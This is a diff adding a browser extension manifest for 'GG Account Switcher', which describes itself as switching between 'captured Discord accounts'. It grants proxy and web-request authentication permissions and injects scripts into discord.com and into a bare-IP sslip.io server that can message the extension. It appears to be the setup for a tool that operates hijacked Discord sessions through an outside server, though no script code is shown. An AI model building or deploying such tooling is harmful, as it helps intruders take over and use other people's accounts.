@@ -1,0 +1,26 @@
+{
+  "manifest_version": 3,
+  "name": "GG Account Switcher",
+  "version": "0.7.1",
+  "description": "Switch between captured Discord accounts in your GG unibox.",
+  "permissions": ["storage", "scripting", "tabs", "alarms", "proxy", "webRequest", "webRequestAuthProvider"],
+  "host_permissions": ["https://discord.com/*", "https://80-208-224-130.sslip.io/*"],
+  "externally_connectable": {
+    "matches": ["https://80-208-224-130.sslip.io/*"]
+  },
+  "background": { "service_worker": "background.js", "type": "module" },
+  "content_scripts": [
+    {
+      "matches": ["https://discord.com/*"],
+      "js": ["content-script.js"],
+      "run_at": "document_start"
+    },
+    {
+      "matches": ["https://80-208-224-130.sslip.io/*"],
+      "js": ["page-bridge.js"],
+      "run_at": "document_start"
+    }
+  ],
+  "action": { "default_popup": "popup.html", "default_title": "GG Account Switcher" },
+  "options_page": "options.html"
+}
